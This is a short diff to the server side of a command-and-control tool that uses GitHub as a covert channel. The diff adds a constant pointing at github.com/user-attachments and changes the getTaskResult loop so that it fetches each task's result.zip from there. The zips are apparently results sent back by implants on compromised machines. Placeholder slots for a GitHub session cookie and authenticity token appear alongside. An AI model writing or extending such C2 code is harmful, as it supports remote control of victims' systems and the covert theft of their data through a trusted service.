@@ -21,11 +21,12 @@ c2_github_config.read('server.ini')
 # COOKIE for example 
 C2_GITHUB_REPO = c2_github_config['github']['c2_github_repo']
 C2_RESULT_REPO = c2_github_config['github']['c2_result_repo']
+C2_GET_NEW_RESULT = "https://github.com/user-attachments"
 C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = c2_github_config['github']['c2_client_user_agent']
 PROXY_HOST = c2_github_config['github']['proxy_host']
 PROXY_PORT = int(c2_github_config['github']['proxy_port'])
-AUTHENTICITY_TOKEN = 'YOUR_AUTHENTICITY_TOKEN'
+AUTHENTICITY_TOKEN =  'YOUR_AUTHENTICITY_TOKEN'
 
 
 
@@ -319,7 +320,7 @@ def getTaskResult(repo_id_result, FIRST_RESULT_ID):
     print(expected_task_id)
 
     while FIRST_RESULT_ID < expected_task_id:
-        current_url = C2_RESULT_REPO + "/files/" + str(FIRST_RESULT_ID) + "/result.zip"
+        current_url = C2_GET_NEW_RESULT + "/files/" + str(FIRST_RESULT_ID) + "/result.zip"
         parsed_url = urlparse(current_url)
         connection = http.client.HTTPSConnection(parsed_url.hostname)
         connection.request("GET", parsed_url.path)
